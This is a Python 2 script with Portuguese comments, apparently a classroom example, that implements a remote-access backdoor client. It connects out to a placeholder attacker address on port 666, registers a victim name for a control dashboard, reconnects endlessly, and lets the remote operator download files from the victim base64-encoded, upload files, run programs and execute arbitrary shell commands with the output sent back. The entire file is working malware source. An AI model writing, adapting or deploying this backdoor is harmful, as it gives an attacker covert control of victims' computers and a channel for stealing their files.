#!/usr/bin/env python3

import socket
import subprocess
import time
import os
import base64 #importa bibliotecas necessárias

nome = "AULA TESTE" #identificação da vítima que aparecerá no dashboard de controle do servidor

while True: #laço infinito
    try: #tratamento de erro
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#cria socket tcp/ip
        timeout = 60 #define o tempo para timeout em segundos
        conexao.settimeout(timeout) #define o timeout do socket com o tempo estipulado pela variável timeout
        conexao.connect(("ip do atacante",666)) #conecta ao endereço do atacante na porta 666
        conexao.send(nome) #envia para o servidor o nome da vítima
        while True: #laço infinito
            try: #tratamento de erro
                comando = conexao.recv(1024) #aguarda o recebimento da informação
            except socket.timeout: #caso o período seja atingido
                a = conexao.send("\r") #envia \r para o servidor informando timeout
                if not a: #caso não seja a
                    conexao.close() #fecha a comunicação
                    break #socket finalizado
                else:
                    continue #continua normalmente o processo
            if not comando:
                raise Exception #tratamento de erro para o socket
            elif comando.startswith("download"): #verifica se inicia com download
                conexao.settimeout(None) #caso o comando seja enviado, o timeout é removido para não expirar a conexão
                nome_do_arquivo = comando.split()[1] #define o nome do arquivo
                try: #bloco de tratamento
                    with open(nome_do_arquivo, "rb") as arquivo: #abre o arquivo em modo leitura
                        arquivo2 = arquivo.read() #lê e armazena o binário
                        conteudo = base64.b64encode(arquivo2) + "\n" #criptografa e envia com \n de fim de comunicação
                    x =  0 #variável de controle
                    while x < len(conteudo): #verifica se o conteúdo é vazio
                        conexao.send(conteudo[x:x+1024]) #envio dos bytes
                        x += 1024 #acúmulo de bytes
                except IOError: #tratamento de erro
                    conexao.send("\\") #alerta de que não é possível fazer download
                conexao.settimeout(timeout) #reajusta o timeout para que a cada 60seg verifique se o servidor está ONLINE
            elif comando.startswith("upload"): #verifica se o comando upload foi digitado
                arquivo_upload = comando.split()[1] #verifica qual arquivo será upado
                resultado = "" #variável vazia de armazenamento
                while True: #laço infinito
                    resultado2 = conexao.recv(1024) #armazenamento de bytes para tratamento
                    resultado += resultado2
                    if not resultado2:
                        raise Exception #tratamento de erros de socket
                    elif resultado2[-1] == "\n": #fim do envio
                        break #finalização deste processo
                try: #tratamento de erro
                    conexao.settimeout(None) #reajuste no timeout
                    with open(arquivo_upload, "rb") as arquivo: #abertura de arquivo
                        conteudo = base64.b64decode(resultado)
                        arquivo.write(conteudo)
                    conexao.send("Upload enviado com sucesso") #envia texto ao servidor
                except IOError: #tratamento de erro caso ocorram erros de upload
                    conexao.send("Falha no envio do upload")
                finally: #executa de qualquer forma o reajuste do timeout
                    conexao.settimeout(timeout)
            elif comando.startswith("exec"):
                conexao.settimeout(None)
                cmd = comando.split()[1:] #verifica o nome do arquivo a ser executado junto com seu paramento -d
                executado = subprocess.Popen(cmd, shell=True) #executa o processo no terminal
                time.sleep(1) #pausa de 1 segundo para execução
                if executado.poll() == None or executado.poll() == 0: #verifica a saída do método poll
                    conexao.send("O arquivo foi executado")
                elif executado.poll() == 1: #verifica saída do método poll
                    conexao.send("Falha na execução do arquivo")
                conexao.settimeout(timeout) #reajusta timeout
            else:
                conexao.settimeout(None) #reajusta timeout
                diretorio = os.getcwd() #verifica em qual diretório está
                if comando.startswith("cd"): #verifica se o comando cd foi digitado
                    try:
                        os.chdir(comando.split()[1]) #altera para o diretório que o atacante deseja navegar
                        diretorio = os.getcwd() #obtém o diretório atual
                    except IndexError: #tratamento de erros
                        conexao.send(base64.b64encode(diretorio) + "\n") #envia a informacao com a finalização da transmissão
                    except WindowsError as e: #tratamento de erros de digitacão em windows
                        conexao.send(base64.b64encode(e.strerror) + "\n") #resposta enviada ao atacante
                    else:
                        conexao.send("\n") #fim de comunicação
                else: #caso não seja cd
                    cmd = subprocess.Popen(comando, shell=True,
                                         stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        cwd=diretorio) #executa o comando em um subprocesso
                    resultado = cmd.stdout.read() + cmd.stderr.read() #obtém a saída do comando
                    conexao.sendall(base64.b64encode(resultado) + "\n") #envia comando finalizando a transmissão
                conexao.settimeout(timeout) #reajusta timeout
    except Exception:
        time.sleep(2) #aguarda 2 segundos

